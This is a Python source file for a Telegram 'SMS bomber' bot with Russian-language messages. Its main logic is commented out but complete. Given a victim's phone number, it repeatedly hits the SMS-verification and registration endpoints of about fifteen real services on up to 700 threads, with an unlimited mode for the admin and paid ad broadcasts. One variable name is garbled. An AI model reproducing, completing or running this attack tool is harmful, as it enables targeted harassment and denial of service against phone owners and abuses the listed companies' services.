import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time

TOKEN = 'Токен'

THREADS_LIMIT = 700

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = "My Id"

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file, "a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(
            f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]


# @bot.message_handler(commands=['start'])
# def start(message):
#     keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
#     boom = types.KeyboardButton(text='Атака на номер')
#     stop = types.KeyboardButton(text='Стоп Спам')
#     piar = types.KeyboardButton(text='Реклама')
#     stats = types.KeyboardButton(text='Статистика')

#     buttons_to_add = [boom, stop, stats, piar]

#     if int(message.chat.id) == ADMIN_CHAT_ID:
#         buttons_to_add.append(types.KeyboardButton(text='Рассылка'))

#     keyboard.add(*buttons_to_add)
#     bot.send_message(
#         message.chat.id, 'Добро пожаловать🙋‍♂!\nНаш канал: @cyberland_x\nОтветственность за ваши действия несете лично вы!\nВыберите действие:',  reply_markup=keyboard)
#     save_chat_id(message.chat.id)


# def send_for_number(phone):
#         request_timeout = 0.00001
#         while True:
#          requests.get('https://findclone.ru/register?phone=+'+phone, params={'phone': '+'+phone})
#          requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
#          requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
#          requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
#          requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
#          requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
#          requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})
#          requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + phone})
#          requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')
#          requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
#          requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': phone})
#          requests.post('https://www.rabota.ru/remind', data={'credential': phone})
#          requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
#          requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
#          requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})


# def start_spam(chat_id, phone_number, force):
#     running_spams_per_chat_id.append(chat_id)

#     if force:
#         msg = f'Спам запущен на неограниченое время для номера +{phone_number}'
#     else:
#          msg = f'Спам запущен на 10 минут на номер +{phone_number}'

#     bot.send_message(chat_id, msg)
#     end = datetime.now() + timedelta(minutes = 10)
#     while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
#         if chat_id not in running_spams_per_chat_id:
#             break
#         send_for_number(phone_number)
#     bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
#     THREADS_AMOUNT[0] -= 1 # стояло 1
#     try:
#         running_spams_per_cзнhat_id.remove(chat_id)
#     except Exception:
#         pass


# def spam_handler(phone, chat_id, force):
#     if int(chat_id) in running_spams_per_chat_id:
#         bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп Спам и поробуйте снова')
#         return

#     # Если количество тредов меньше максимального создается новый который занимается спамом
#     if THREADS_AMOUNT[0] < THREADS_LIMIT:
#         x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
#         threads.append(x)
#         THREADS_AMOUNT[0] += 1
#         x.start()
#     else:
#         bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут')
#         print('Максимальное количество тредов исполняется. Действие отменено.')


# @bot.message_handler(content_types=['text'])
# def handle_message_received(message):
#     chat_id = int(message.chat.id)
#     text = message.text

#     if text == 'Атака на номер':
#         bot.send_message(chat_id, 'Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx')

#     elif text == 'Статистика':
#         bot.send_message(chat_id, f'📊Статистика отображается в реальном времени📡!\nПользователей🙎‍♂: {users_amount[0]}\nСервисов для RU🇷🇺: 25\nСервисов для UK🇺🇦: 10\nБот запущен: 12.06.2019')

#     elif text == 'Реклама':
#         bot.send_message(chat_id, 'В Нашем Боте 1 рассылка стоит  100 рублей\nЕе получат все пользователи бота\nПо вопросам покупки писать @TRILD')

#     elif text == 'Рассылка' and chat_id==ADMIN_CHAT_ID:
#         bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

#     elif text == 'Стоп Спам':
#         if chat_id not in running_spams_per_chat_id:
#             bot.send_message(chat_id, 'Вы еще не начинали спам')
#         else:
#             running_spams_per_chat_id.remove(chat_id)

#     elif 'РАЗОСЛАТЬ: ' in text and chat_id==ADMIN_CHAT_ID:
#         msg = text.replace("РАЗОСЛАТЬ: ","")
#         send_message_users(msg)

#     elif len(text) == 11:
#         phone = text
#         spam_handler(phone, chat_id, force=False)


#     elif len(text) == 12:
#         phone = text
#         spam_handler(phone, chat_id, force=False)


#     elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
#         phone = text[1:]
#         spam_handler(phone, chat_id, force=True)

#     else:
#         bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
#         print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')

# if __name__ == '__main__':
#     bot.polling(none_stop=True)
